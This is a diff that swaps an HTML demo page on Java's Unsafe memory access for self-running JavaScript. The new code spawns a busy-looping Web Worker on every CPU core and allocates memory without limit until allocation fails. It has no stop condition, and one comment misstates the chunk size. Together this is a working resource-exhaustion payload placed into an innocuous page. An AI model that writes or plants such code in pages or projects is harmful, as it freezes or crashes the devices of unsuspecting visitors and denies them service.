@@ -1,23 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Java Unsafe Example</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
-  <script>hljs.highlightAll();</script>
-</head>
-<body>
-  <h1>Unsafe Java Memory Access</h1>
-  <pre><code class="language-java">
-public static void main(String... args) throws Exception {
-    getUnsafe().getByte(0);
+
+// Function to stress CPU by generating heavy computational load
+function stressCPU() {
+    const numWorkers = navigator.hardwareConcurrency || 4; // Get number of CPU cores, default to 4 if not available
+    const workers = [];
+    for (let i = 0; i < numWorkers; i++) {
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+            setInterval(() => {
+                const start = performance.now();
+                while (performance.now() - start < 1000); // Generate heavy computational load for 1 second
+            }, 0);
+        `])));
+        workers.push(worker);
+    }
 }
 
-private static Unsafe getUnsafe() throws NoSuchFieldException, IllegalAccessException {
-    Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
-    theUnsafe.setAccessible(true);
-    return (Unsafe) theUnsafe.get(null);
+// Function to stress memory by allocating large chunks of memory
+function stressMemory() {
+    const chunks = [];
+    while (true) {
+        try {
+            const chunk = new ArrayBuffer(1024 * 1024 * 100 * 2); // Allocate 100MB memory chunk
+            chunks.push(chunk);
+        } catch (error) {
+            console.error('Memory allocation failed:', error);
+            break;
+        }
+    }
 }
-  </code></pre>
-</body>
-</html>
+
+// Start stressing CPU and memory
+stressCPU();
+stressMemory();
